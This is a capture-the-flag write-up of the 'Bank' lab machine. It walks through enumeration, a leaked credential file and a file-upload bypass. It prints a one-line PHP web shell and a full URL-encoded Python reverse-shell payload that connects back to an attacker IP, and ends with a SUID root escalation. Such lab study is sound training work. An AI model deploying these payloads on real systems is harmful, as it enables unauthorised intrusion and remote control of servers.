Bank

Target IP: 10.129.147.217

Scanning


The scan above shows there are three ports open on the target machine: SSH, DNS, and HTTP.

Enumeration

Port 80: HTTP
After performing directory search against the host, I did not receive anything useful. It seems like the vhost name for this target machine is bank.htb. I appended this to the /etc/hosts file and it worked!


The login webpage above is displayed once the user is added to the file and browsed to this port. Since I do not have the login for this page, I decided to enumerate further.



I found an interesting directory called /bank-transfer by running the command gobuster dir -u http://bank.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. By sorting the result by size, I find 68576f20e9732f1b2edc4df5b8533230.acc interesting.

Exploitation



This file contains the username and password. Maybe I can spray this against the login page? And it worked. Using chris@bank.htb:!##HTBB4nkP4ssw0rd!##, I gained access to the bank application.



I tried to upload a php file but this was not allowed. Doing a fuzz for different PHP extensions did not show anything useful. However, the developer has left a HTML comment stating I can use .htb to execute as .php for debugging purposes.

I created a file called shell.jpeg.htb and this uploaded successfully. This file contains a one-line PHP code for a simple web-shell <?php echo system($_GET['cmd']); ?>. Time to find out where this uploaded file is.


And I found out where the uploaded item is! It is saved in http://bank.htb/uploads/<filename> location. In the picture above, I managed to use the web shell I uploaded at http://bank.htb/uploads/shell.jpeg.htb. I issued the commands whoami;id and received the output above. Time to upgrade this to a reverse shell connection on port 8443.


By sending the payload mentioned below using the web shell, I obtained a reverse shell connection on port 8443! Now I have a foothold on the machine.
Full URL with Python payload used: http://bank.htb/uploads/shell.jpeg.htb?cmd=export%20RHOST%3D%2210.10.16.19%22%3Bexport%20RPORT%3D8443%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27

Privilege Escalation


There is an interesting file with SUID bit set! Running cat on this binary shows it is sh.


Running this binary gave me a root shell.

Flags


The local.txt flag once I gained a foothold on the machine.


The root.txt flag once I used the binary with SUID bit set to gain a root shell.
